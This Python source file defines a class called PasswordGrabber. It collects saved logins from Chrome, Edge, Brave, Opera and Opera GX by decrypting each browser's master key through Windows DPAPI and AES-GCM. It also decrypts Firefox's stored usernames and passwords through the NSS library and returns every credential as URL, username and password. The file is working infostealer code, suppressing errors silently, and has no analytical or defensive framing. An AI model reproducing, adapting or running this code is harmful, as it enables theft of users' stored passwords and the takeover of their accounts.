import os
import json
import base64
import sqlite3
import shutil
import pathlib
import ctypes
import random
import string
from Crypto.Cipher import AES
import win32crypt

class TSECItem(ctypes.Structure):
    _fields_ = [('type', ctypes.c_int), ('data', ctypes.c_void_p), ('len', ctypes.c_uint)]

class PasswordGrabber:
    def __init__(self):
        self.local = pathlib.Path(os.environ['LOCALAPPDATA'])
        self.roaming = pathlib.Path(os.environ['APPDATA'])
        self.temp = pathlib.Path(os.environ['TEMP'])
        self.chromium_targets = {
            "Chrome": self.local / "Google/Chrome/User Data",
            "Edge": self.local / "Microsoft/Edge/User Data",
            "Brave": self.local / "BraveSoftware/Brave-Browser/User Data",
            "Opera": self.roaming / "Opera Software/Opera Stable",
            "Opera GX": self.local / "Opera Software/Opera GX Stable"
        }

    def get_master_key(self, path):
        try:
            with open(path / "Local State", "r", encoding="utf-8") as f:
                key = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        except: return None

    def decrypt_password(self, buff, master_key):
        try:
            iv, payload = buff[3:15], buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode()
        except: return ""

    def firefox_decrypt(self, nss, cipher_text):
        try:
            data = base64.b64decode(cipher_text)
            inp = TSECItem(0, ctypes.cast(ctypes.create_string_buffer(data), ctypes.c_void_p), len(data))
            out = TSECItem(0, None, 0)
            if nss.PK11SDR_Decrypt(ctypes.byref(inp), ctypes.byref(out), None) == 0:
                return ctypes.string_at(out.data, out.len).decode('utf-8')
        except: pass
        return ""

    def run(self):
        results = []
        for name, path in self.chromium_targets.items():
            key = self.get_master_key(path)
            if not key: continue
            for profile in ['Default'] + [p.name for p in path.glob("Profile *")]:
                db = path / profile / "Login Data"
                if db.exists():
                    tmp = self.temp / f"p{os.getpid()}{random.randint(1,999)}.db"
                    shutil.copy2(db, tmp)
                    conn = sqlite3.connect(tmp)
                    for url, user, pwd in conn.execute("SELECT action_url, username_value, password_value FROM logins"):
                        if user: results.append(f"[{name}] {url} | {user} | {self.decrypt_password(pwd, key)}")
                    conn.close()
                    os.remove(tmp)

        ff_path = self.roaming / "Mozilla/Firefox/Profiles"
        nss_dir = pathlib.Path(os.environ.get("ProgramFiles", "C:\\Program Files")) / "Mozilla Firefox"
        if ff_path.exists() and (nss_dir / "nss3.dll").exists():
            try:
                os.add_dll_directory(str(nss_dir))
                nss = ctypes.CDLL(str(nss_dir / "nss3.dll"))
                for prof in ff_path.glob("*.default*"):
                    if nss.NSS_Init(str(prof).encode('utf-8')) == 0:
                        login_f = prof / "logins.json"
                        if login_f.exists():
                            for item in json.load(open(login_f))['logins']:
                                u = self.firefox_decrypt(nss, item['encryptedUsername'])
                                p = self.firefox_decrypt(nss, item['encryptedPassword'])
                                results.append(f"[Firefox] {item['hostname']} | {u} | {p}")
                        nss.NSS_Shutdown()
            except: pass
        return results